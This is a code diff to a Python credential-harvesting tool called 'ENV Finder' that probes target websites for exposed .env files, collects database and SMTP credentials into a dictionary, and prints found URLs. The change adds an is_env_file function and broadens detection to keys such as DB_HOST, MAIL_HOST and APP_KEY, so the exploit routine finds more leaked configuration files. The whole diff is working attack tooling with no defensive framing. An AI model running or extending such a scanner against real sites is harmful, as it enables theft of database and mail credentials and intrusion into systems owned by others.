@@ -11,7 +11,7 @@ LIME = Fore.LIGHTGREEN_EX
 banner = f"""{LIME}{Style.BRIGHT}
 ╔════════════════════════════════════════════════════════╗
 ║                                                        ║
-║              ENV Finder By Bob Marley         	     ║
+║              ENV Finder By Bob Marley      	         ║
 ║                                                        ║
 ╚════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}"""
@@ -43,6 +43,10 @@ db_creds_dict = {}  # {site_base: (host, user, pass, name)}
 def safe_find(pattern, text):
     m = re.search(pattern, text, re.MULTILINE)
     return m.group(1).strip() if m else ''
+
+def is_env_file(text):
+    # Check for at least one of these common .env keys
+    return any(key in text for key in ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"])
 
 def grab_smtp(url, text):
     if 'MAIL_HOST' in text:
@@ -192,7 +196,7 @@ def exploit(target):
         exploit_path = site_base.rstrip('/') + read_path
         try:
             resp = requests.get(exploit_path, timeout=10)
-            if resp.status_code == 200 and "APP_NAME" in resp.text:
+            if resp.status_code == 200 and is_env_file(resp.text):
                 if exploit_path not in found_urls:
                     found_urls.add(exploit_path)
                     print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
